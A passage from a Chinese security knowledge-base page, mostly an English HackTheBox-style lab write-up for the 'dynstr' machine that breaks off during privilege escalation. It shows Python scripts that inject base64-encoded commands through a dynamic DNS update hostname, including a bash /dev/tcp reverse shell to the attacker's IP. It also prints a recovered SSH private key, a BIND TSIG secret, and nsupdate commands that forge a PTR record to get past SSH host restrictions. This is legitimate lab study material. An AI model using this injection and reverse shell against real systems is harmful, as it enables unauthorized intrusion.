---
title: DNS、NFS、邮件与多主机信任
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/services/
categories:
- 系统安全
- 网络服务
tags:
- 知识库
- 文件权限
- DNS
- 命令注入
- FTP
- PCAP
- SSH
- chkrootkit
- NFS
- UID
- OpenSMTPD
- Kerberos
- keytab
description: 网络服务的导出、代理、认证与文件映射会把远程身份带到本地系统。本章保留原环境中的协议枚举、UID、DNS 记录、邮件服务和双主机拓扑，便于检查信任如何传递。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

网络服务的导出、代理、认证与文件映射会把远程身份带到本地系统。本章保留原环境中的协议枚举、UID、DNS 记录、邮件服务和双主机拓扑，便于检查信任如何传递。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/services/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Vulnix 的 UID 与 root_squash、Dynstr 的 PTR 与更新密钥各有明确配置条件。

Chanakya 由 FTP 材料转到授权密钥和周期任务，Tentacle 继续分析 keytab。

WinterMute 的两台机器按原网络分层，TTY、转发和 LXD 的顺序完整保留。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [动态 DNS 更新与反向记录](#case-dynstr) | dynstr | DNS、命令注入、文件权限 |
| [FTP 流量与授权密钥](#case-ha-chanakya) | HA-Chanakya | FTP、PCAP、SSH、chkrootkit |
| [NFS UID 映射与 root_squash](#case-hacklab-vulnix) | HackLAB-Vulnix | NFS、UID、文件权限 |
| [代理、OpenSMTPD 与 keytab](#case-tentacle) | tentacle | OpenSMTPD、Kerberos、keytab、Squid |
| [双主机网络与 LXD 边界](#case-wintermute-1) | WinterMute-1 | 端口转发、LXD、Struts |

<a id="case-dynstr"></a>

## 动态 DNS 更新与反向记录

动态 DNS API 的输入、PTR 记录和 SSH 访问关系共同决定入口。后半段保留 bindmgr 脚本对文件权限与路径处理的细节。

<p class="kb-provenance">来源 dynstr · 原记录 2021-06-14 · 38 个代码块 · 7 处图片引用</p>

<details class="kb-evidence" id="record-dynstr">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start dynstr -->

#### introduce

OS: Linux
Difficulty: Medium
Points:	30
Release:	12 Jun 2021
IP:	10.10.10.244

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2000.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### Enumeration
#### Ports

|Ports|service|version|
|-----|----|-----|
|22|SSH|OpenSSH 8.2p1 Ubuntu 4ubuntu0.2|
|53|DNS|ISC BIND 9.16.1 (Ubuntu Linux)|
|80|HTTP|Apache httpd 2.4.41|

#### NMAP
```bash
# Nmap 7.91 scan initiated Sun Jun 13 04:53:49 2021 as: nmap -vvv -p 22,53,80 -A -v -oN intial.nmap 10.10.10.244
Nmap scan report for dynstr.htb (10.10.10.244)
Host is up, received syn-ack (0.16s latency).
Scanned at 2021-06-13 04:53:51 BST for 16s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC//sbOTQwLRH4CGj3riDnnTvTCiJT1Uz7CyRSD2Tkh2wkT20rtAq13c5M1LC2kxki2bz9Ptxxx340Cc9tAcQaPZbmHndQe/H1bGiVZCKjOl2WqWQTV9fq6GGtflC94BkkLrmkWHzqg+S50g2Zg0iesPMkKAmwqwEVZx9npe1QuF3RQu5EYQXRYVOzpqQdU+jRD267gCvsKp9xmr7trZ1UzFxfBUOzSCWa3Adm2TTFwiA5jTb6x0lKVnQtgKghioMQeXXPuiTLCbI0XfbksoRI2OBAvTZf7RsIthKCiyCQRWjVh5Idr5Fh7GgwYaDgW662W3V3hCNEQRY8R9/fXWdVho1gWbm6NFt+NyRO/6F2XDvPseBYr+Yi6zwGEM+PpsTi5dfj8yYKRZ3HFXwjeBGjCPMRe9XPpCvvDnHAF18B1INVJPSwAIVll365V5D18JslQh7PpAWxO70TzmEC9E+UPXOrt29tZ0Zi/uApFRM700pdOhnvcs8q4RBWaUpp3ZB0=
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFtYzp8umMbm7o9+1LUTVio/dduowE/AsA3rO52A5Q/Cuct9GY6IZEvPE+/XpEiNCPMSl991kjHT+WaAunmTbT4=
|   256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOz8b9MDlSPP5QJgSHy6fpG98bdKCgvqhuu07v5NFkdx
53/tcp open  domain  syn-ack ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 13 04:54:07 2021 -- 1 IP address (1 host up) scanned in 18.86 seconds
```

#### DNS Enumeration

For this part I reffered to one of my favourite website for refference https://book.hacktricks.xyz/pentesting/pentesting-dns
Let's get the banner for the DNS version

```bash
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# dig version.bind CHAOS TXT @dyna.htb

; <<>> DiG 9.16.13-Debian <<>> version.bind CHAOS TXT @dyna.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 61304
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 2c3040bb3d8e6c5b0100000060c6e3286e8c14a06e158e06 (good)
;; QUESTION SECTION:
;version.bind.                  CH      TXT

;; ANSWER SECTION:
version.bind.           0       CH      TXT     "9.16.1-Ubuntu"

;; Query time: 332 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: 一 6月 14 01:01:42 EDT 2021
;; MSG SIZE  rcvd: 95
```

Looking at almost any record that is publicly available we find some subdomains

```bash
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# dig ANY @10.10.10.244 dyna.htb

; <<>> DiG 9.16.13-Debian <<>> ANY @10.10.10.244 dyna.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 43818
;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 41dc2957b1ff99420100000060c6e373bcf7cb1343550555 (good)
;; QUESTION SECTION:
;dyna.htb.                      IN      ANY

;; ANSWER SECTION:
dyna.htb.               60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030305 21600 3600 604800 60
dyna.htb.               60      IN      NS      dns1.dyna.htb.

;; ADDITIONAL SECTION:
dns1.dyna.htb.          60      IN      A       127.0.0.1

;; Query time: 324 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: 一 6月 14 01:02:57 EDT 2021
;; MSG SIZE  rcvd: 147
```

let's add those to /etc/hosts

```bash
sudo echo "10.10.10.244  dns1.dyna.htb hostmaster.dyna.htb" >> /etc/hosts
```

visiting the subdomains doesn't do you any good. it's the same website so let's move on.

#### Web Enumeration

visiting the website we can see the potential dns name for the host.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2001.jpg)

At the very bottom of the page we can see there is the email to contact with the domain dyna.htb so let's add it in /etc/hosts

```bash
sudo echo "10.10.10.244  dyna.htb" >> /etc/hosts 
```

let's visit the page nothing changed.

#### Directory Fuzzing

```bash
┌──(root💀kali)-[~/ffuf]
└─# ./ffuf -u http://dyna.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c -e .txt,.php,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://dyna.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .txt .php .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htpasswd.html          [Status: 403, Size: 273, Words: 20, Lines: 10]
.htpasswd.php           [Status: 403, Size: 273, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10]
.htaccess.txt           [Status: 403, Size: 273, Words: 20, Lines: 10]
.htaccess.html          [Status: 403, Size: 273, Words: 20, Lines: 10]
.htaccess.php           [Status: 403, Size: 273, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10]
.htpasswd.txt           [Status: 403, Size: 273, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 305, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 10909, Words: 1937, Lines: 282]
nic                     [Status: 301, Size: 302, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10]
:: Progress: [81876/81876] :: Job [1/1] :: 388 req/sec :: Duration: [0:03:31] :: Errors: 104 ::
```

we have intresting nic directory.
Visiting that nic directory we can see just a blank page so let's the and fuzz that directory again.

```bash
┌──(root💀kali)-[~/ffuf]
└─# ./ffuf -u http://dyna.htb/nic/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://dyna.htb/nic/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10]
update                  [Status: 200, Size: 8, Words: 1, Lines: 2]
:: Progress: [20469/20469] :: Job [1/1] :: 982 req/sec :: Duration: [0:00:38] :: Errors: 3 ::
```
We got the subdirectory update let's check it.
Visiting the directory we got the bad auth as output.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2002.jpg)

From earlier we have creds for beta version of the website.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2003.jpg)

So let's try to auth with HTTP basic authentication.
I wrote a simple python script for that

```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth

url = 'http://dyna.htb/nic/update'

res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'))
print (res.text)
```

Running the script we get the following output.

```bash
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# python3 script.py 
nochg 10.10.14.10
```

at first I didn't understand nochg in reponse so I google nochg and landed on the following article.

 - [Return Codes (RA-API)](https://help.dyn.com/remote-access-api/return-codes/)

It looks like it's an API for dynamic DNS and we are at the update portal.

Looking at the following article we can see how to perform updates.

 - [Perform Update (RA-API)](https://help.dyn.com/remote-access-api/perform-update/)

looking at the example in article I knew that I have to pass two parameter atleast to perform update i.e the hostname and myip so let's try it.

Again going back to website we know we have few dynamic dns running so let's try and get it.

Updated python script to perform updates

```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth

url = 'http://dyna.htb/nic/update'
params = {
	'myip' : '10.10.14.10',
	'hostname': 'test.no-ip.htb'
}

res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'), params=params)
print (res.text)
```

let's send this request.

```bash
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# python3 script.py 
good 10.10.14.10
```

we got the good response so we can perform update now let's look at some parameters we can tamper.

Looking through the above perform update article I can see one intresting thing that the update will get distributed to all the linked device so if we can inject the hostname we can get the possible RCE and I thought about injecting IP but it's is not possible as it will lead to validation problem as IP cannot have character so we can inject hostname and send payload as subdomain name but we cannot use special chars as it is not allowed as a domain name so we have base64 encode the payload and send the request.

```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

url = 'http://dyna.htb/nic/update'
payload = b'id'
final = b64encode(payload)
print (final)
params = {
	'myip' : '10.10.14.10',
	'hostname': '{}.no-ip.htb'.format(final)
}


res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'), params=params)
print (res.text)
```

let's run the script.

```bash
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# python3 script.py 
b'aWQ='
911 [nsupdate failed]
```

 - [noip request](https://www.noip.com/integrate/request)

It said nsudate failed so we know that we cannot update ns record but going through documentation we have an option to push update offline.

so let's try that.

```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

url = 'http://dyna.htb/nic/update'
payload = b'pwd'
final = b64encode(payload)
#print (final)
params = {
	'myip' : '10.10.14.10',
	'hostname': '`echo "{}" | base64 -d | bash`test.no-ip.htb'.format(str(final)),
	'offline': 'YES'
}


res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'), params=params)
print (res.text)
```

we get the output

```bash
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# python3 script.py 
good 10.10.14.10
```

Looks like it could to blind RCE so let's try and ping your machine.
UPDATED script

```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

url = 'http://dyna.htb/nic/update'
payload = b'ping -c 4 10.10.14.10'
final = b64encode(payload)
print ('{}'.format(final.decode()))
params = {
	'myip' : '10.10.14.10',
	'hostname': '`echo "{}" | base64 -d | bash`"dynadns.no-ip.htb'.format(final.decode()),
	'offline': 'YES'
}


res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'), params=params)
print (res.text)
```

Running the script

```bash
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# python3 script.py 
cGluZyAtYyA0IDEwLjEwLjE0LjEw
server 127.0.0.1
zone no-ip.htb
update delete PING 10.10.14.10 (10.10.14.10) 56(84) bytes of data.
64 bytes from 10.10.14.10: icmp_seq=1 ttl=63 time=300 ms
64 bytes from 10.10.14.10: icmp_seq=2 ttl=63 time=299 ms
64 bytes from 10.10.14.10: icmp_seq=3 ttl=63 time=299 ms
64 bytes from 10.10.14.10: icmp_seq=4 ttl=63 time=298 ms

--- 10.10.14.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 297.622/298.907/300.286/0.946 msdynadns.no-ip.htb
good 10.10.14.10
```

Got the ping back

```bash
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# tcpdump -i tun0 -n icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:51:41.981360 IP 10.10.10.244 > 10.10.14.10: ICMP echo request, id 1, seq 1, length 64
01:51:41.981456 IP 10.10.14.10 > 10.10.10.244: ICMP echo reply, id 1, seq 1, length 64
01:51:42.980493 IP 10.10.10.244 > 10.10.14.10: ICMP echo request, id 1, seq 2, length 64
01:51:42.980513 IP 10.10.14.10 > 10.10.10.244: ICMP echo reply, id 1, seq 2, length 64
01:51:43.981906 IP 10.10.10.244 > 10.10.14.10: ICMP echo request, id 1, seq 3, length 64
01:51:43.981921 IP 10.10.14.10 > 10.10.10.244: ICMP echo reply, id 1, seq 3, length 64
01:51:44.982448 IP 10.10.10.244 > 10.10.14.10: ICMP echo request, id 1, seq 4, length 64
01:51:44.982463 IP 10.10.14.10 > 10.10.10.244: ICMP echo reply, id 1, seq 4, length 64
01:51:45.289182 IP 10.10.10.244 > 10.10.14.10: ICMP echo request, id 2, seq 1, length 64
01:51:45.289253 IP 10.10.14.10 > 10.10.10.244: ICMP echo reply, id 2, seq 1, length 64
01:51:46.289399 IP 10.10.10.244 > 10.10.14.10: ICMP echo request, id 2, seq 2, length 64
01:51:46.289414 IP 10.10.14.10 > 10.10.10.244: ICMP echo reply, id 2, seq 2, length 64
01:51:47.290146 IP 10.10.10.244 > 10.10.14.10: ICMP echo request, id 2, seq 3, length 64
01:51:47.290164 IP 10.10.14.10 > 10.10.10.244: ICMP echo reply, id 2, seq 3, length 64
01:51:48.291232 IP 10.10.10.244 > 10.10.14.10: ICMP echo request, id 2, seq 4, length 64
01:51:48.291246 IP 10.10.14.10 > 10.10.10.244: ICMP echo reply, id 2, seq 4, length 64
```

#### Exploitation

Let's get the revshell back to our machine

#### Don't forget to spin up listener on that port.

```python
#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
from base64 import b64encode

url = 'http://dyna.htb/nic/update'
payload = b'bash -i >& /dev/tcp/10.10.14.10/1122 0>&1'
final = b64encode(payload)
print ('{}'.format(final.decode()))
params = {
	'myip' : '10.10.14.10',
	'hostname': '`echo "{}" | base64 -d | bash`"dynadns.no-ip.htb'.format(final.decode()),
	'offline': 'YES'
}


res = requests.get(url, verify=False, auth=HTTPBasicAuth('dynadns', 'sndanyd'), params=params)
print (res.text)
```

on NC

```bash
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# rlwrap nc -nlvp 1122
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1122
Ncat: Listening on 0.0.0.0:1122
Ncat: Connection from 10.10.10.244.
Ncat: Connection from 10.10.10.244:53898.
bash: cannot set terminal process group (745): Inappropriate ioctl for device
bash: no job control in this shell
id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
whoami
www-data
www-data@dynstr:/var/www/html/nic$
```

We have REV shell now let's go onto user.

#### WWW-Data to bindmgr
#### Enumeration

```bash
ls -al /home
total 16
drwxr-xr-x  4 root    root    4096 Mar 15 20:26 .
drwxr-xr-x 18 root    root    4096 May 25 14:52 ..
drwxr-xr-x  5 bindmgr bindmgr 4096 Mar 15 20:39 bindmgr
drwxr-xr-x  3 dyna    dyna    4096 Mar 18 20:00 dyna
```

Looks like we have access to both of the users.
let's check bindmgr

```bash
ls -al
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
-r-------- 1 bindmgr bindmgr   33 Jun 13 00:03 user.txt
```

Looks like we have access .ssh so let's look into it.

```bash
ls -al
total 24
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 ..
-rw-r--r-- 1 bindmgr bindmgr  419 Mar 13 12:00 authorized_keys
-rw------- 1 bindmgr bindmgr 1823 Mar 13 11:48 id_rsa
-rw-r--r-- 1 bindmgr bindmgr  395 Mar 13 11:48 id_rsa.pub
-rw-r--r-- 1 bindmgr bindmgr  444 Mar 13 12:09 known_hosts
```

We can get the id_rsa.pub,known host and authorized_keys but not id_rsa that sucks.

Let's check authorized_keys first.

```bash
cat authorized_keys
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```

We can connect to bindmgr using his private key if we satisfy this DNS record condition \*.infra.dyna.htb but can't get into that until we have the id_rsa even if we pass the check.

Looking inside home directory we have access to another unsual and intresting directory support-case-C62796521.
Let's look into it.

```bash
ls -al
total 436
drwxr-xr-x 2 bindmgr bindmgr   4096 Mar 13 14:53 .
drwxr-xr-x 5 bindmgr bindmgr   4096 Mar 15 20:39 ..
-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 14:53 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13 14:53 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13 14:53 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 14:52 strace-C62796521.txt
```

let's check all the files

```bash
<-----SNIP------>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
<-----SNIP------>
```

We have the output key in strace file.
strace-C62796521.txt
So now we have the private key now we can start working on the DNS condition part for SSH login.

#### Exploitation

As we know that PTR records provides the domain name associated with an IP so we have to add PTR record that matches the above regex that is pointing to our IP.

First of all to edit the records for infra we have to get the key for infra so let's get it by going to /etc/bind/infra.key

```bash
cat /etc/bind/infra.key
key "infra-key" {
        algorithm hmac-sha256;
        secret "7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=";
};
```

Now that we have the key we can bind out record into DNS so let's try that.
First we have to load up the nslookup console and import the keyfile.

```bash
nsupdate -k /etc/bind/infra.key
```

Then let's add the A record for our host

```bash
update add test.infra.dyna.htb 86400 A 10.10.14.5

update add 5.14.10.10.in-addr.arpa 300 PTR test.infra.dyna.htb
```

For eg- your ip is 10.10.14.127
Reverse ip is 127.14.10.10
It's is important to leave a line after addition of the A record or else it will give you an update failed: NOTZONE error.
so after this let's see what we are adding.

```bash
nsupdate -k /etc/bind/infra.key
update add oops.infra.dyna.htb 86400 A 10.10.14.5

update add 5.14.10.10.in-addr.arpa 86400 PTR oops.infra.dyna.htb
show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
5.14.10.10.in-addr.arpa. 86400  IN      PTR     oops.infra.dyna.htb.

send
quit
```

And then after that send it and quit.
now let's copy the above RSA key in a id_rsa file and let's SSH.

```bash
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# chmod 700 id_rsa
┌──(root💀kali)-[~/hackthebox/machine/dynstr]
└─# ssh -i id_rsa bindmgr@dyna.htb                                                                                                            
Last login: Sun Jun 13 19:22:54 2021 from test.infra.dyna.htb
bindmgr@dynstr:~$ id
uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
bindmgr@dynstr:~$ whoami
bindmgr
bindmgr@dynstr:~$ ls
id_rsa  root.txt  support-case-C62796521  user.txt
bindmgr@dynstr:~$ cat user.txt
32ce9c7cacb7d79e7ae424b0c42b6647
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2004.jpg)

And we are bindmgr let's get root now.

#### PrivESC
#### Enumeration
#### sudo -l

```bash
bindmgr@dynstr:/tmp$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

Looks like we can run /usr/bin/local/bindmgr.sh as root so let's look into script.

```bash
#!/usr/bin/bash
# This script generates named.conf.bindmgr to workaround the problem
# that  bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#named.conf.bindmgr.
#
# TODO: Currently the script is only adding files to the directory but
#not deleting them. As we generate the list of files to be included
#from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
	echo "[-] ERROR: Check versioning. Exiting."
	exit 42
fi  
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then                                                                     [0/598]
	echo "[-] ERROR: Check versioning. Exiting."
	exit 43
fi
